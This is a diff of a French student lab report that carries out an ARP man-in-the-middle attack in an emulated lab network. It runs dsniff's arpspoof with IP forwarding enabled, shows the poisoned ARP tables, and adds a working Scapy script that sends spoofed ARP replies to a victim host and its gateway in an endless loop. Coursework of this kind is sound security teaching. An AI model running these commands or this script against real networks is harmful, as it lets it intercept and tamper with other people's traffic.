@@ -204,4 +204,39 @@ PC1> show arp
 
 Mettre en place un ARP MITM
 
-debian@debian:~$ sudo apt install dsniff
+ sudo apt install dsniff
+
+ sudo sysctl -w net.ipv4.ip_forward=1
+
+ sudo arpspoof -i ens4 -r -t 10.2.1.10 10.2.1.254
+c:e6:3:92:0:0 0:50:79:66:68:0 0806 42: arp reply 10.2.1.254 is-at c:e6:3:92:0:0
+c:e6:3:92:0:0 c:a:72:0:0:1 0806 42: arp reply 10.2.1.10 is-at c:e6:3:92:0:0
+c:e6:3:92:0:0 0:50:79:66:68:0 0806 42: arp reply 10.2.1.254 is-at c:e6:3:92:0:0
+c:e6:3:92:0:0 c:a:72:0:0:1 0806 42: arp reply 10.2.1.10 is-at c:e6:3:92:0:0
+
+Table ARP de node1.tp2.efrei :
+
+ show arp
+
+0c:e6:03:92:00:00  10.2.1.11 expires in 28 seconds
+0c:e6:03:92:00:00  10.2.1.254 expires in 120 seconds
+
+ip neighbor show
+10.2.1.11 dev eth1 lladdr 0c:e6:03:92:00:00 STALE
+192.168.122.1 dev eth0 lladdr 52:54:00:23:04:c2 STALE
+10.2.1.253 dev eth1 lladdr 0c:f8:d7:6a:00:00 STALE
+10.2.1.10 dev eth1 lladdr 0c:e6:03:92:00:00 REACHABLE
+
+Capture Wireshark arp_mitm.pcap
+
+Réaliser la même attaque avec Scapy
+
+from scapy.all import *
+
+victime = Ether(dst="00:50:79:66:68:00")/ARP (pdst="10.2.1.10", psrc="10.2.1.254")
+routeur = Ether(dst="0c:0a:72:00:00:01")/ARP (pdst="10.2.1.254", psrc="10.2.1.10")
+
+while True:
+
+    sendp(victime, iface="enp0s3")
+    sendp(routeur, iface="enp0s3")
